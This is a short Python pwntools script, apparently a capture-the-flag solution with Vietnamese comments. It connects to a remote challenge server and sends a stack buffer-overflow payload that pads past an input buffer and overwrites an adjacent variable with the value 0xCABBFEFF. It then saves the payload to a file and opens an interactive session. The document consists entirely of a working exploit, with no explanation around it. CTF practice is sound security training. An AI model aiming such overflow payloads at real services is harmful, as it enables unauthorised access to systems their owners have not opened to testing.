from pwn import *

binary  = context.binary = ELF('./hpbd')

#p = process('./hpbd')
p = remote('61.28.237.24','30200')

# padding từ biến nhập và đến v5
payload = b'A'*(0x24-0xc)

# overwrite giá trị mới vào v5
payload += p32(0xCABBFEFF)

f = open("solve.txt","wb")
p.sendline(payload)
f.write(payload)
p.interactive()